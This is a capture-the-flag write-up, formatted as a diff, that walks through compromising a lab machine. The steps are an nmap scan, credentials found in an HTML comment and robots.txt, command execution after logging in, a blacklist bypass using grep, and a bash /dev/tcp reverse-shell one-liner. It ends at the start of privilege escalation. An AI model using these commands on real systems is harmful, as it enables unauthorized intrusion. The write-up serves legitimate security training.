@@ -1,0 +1,54 @@
+--Enumeration--
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 14:17 E. Africa Standard Time
+
+Nmap scan report for 10.10.170.149
+Host is up (0.35s latency).
+Not shown: 98 closed tcp ports (reset)
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 18.04 seconds
+
+## We got 2 ports up , 22 and 80
+
+## Opening up port 80 from the browser, and reading the source code I get :
+
+ <!--
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+  -->
+## We have a username : R1ckRul3s , and viewing the robots.txt file I get something (a weird string) : Wubbalubbadubdub
+
+## I assume that might be the password of the username or a path, but nope it’s obviously not a path since it’s giving 404 Not Found error.
+
+## I now perform a directory search , to look for any file/folder that is available.
+
+
+## We get login.php , and that’s look valid:)
+
+## I use the username and password(I guess) that we found earlier , from comment and robots.txt to login:
+
+username : R1ckRul3s
+password : Wubbalubbadubdub
+FootHold
+## I was able to Run commands after loggin in .!
+
+## Except trying to read a file using cat I was receiving a weird GIF , that insulted my skills:
+
+## Basically it has some commands that are blacklisted , but we can still read the files, I hope!
+
+## Using grep . <filename> I was able to read the files.
+
+## I now grab my revshell , I first check if nc or netcat is in the system , and luckily it is in the system:
+
+## but despite it being there it doesn’t actually seem to execute / work.
+
+## with bash -c "bash -i &>/dev/tcp/<ip>/<port> <&1" I was able to get a reverse shell and the second ingredient was in /home/rick and the third ingredient was in /root/
+
+--PRIVESC--
+Running sudo -l I was able to see that I have permission to run as sudo in the whole system without having to enter a password:
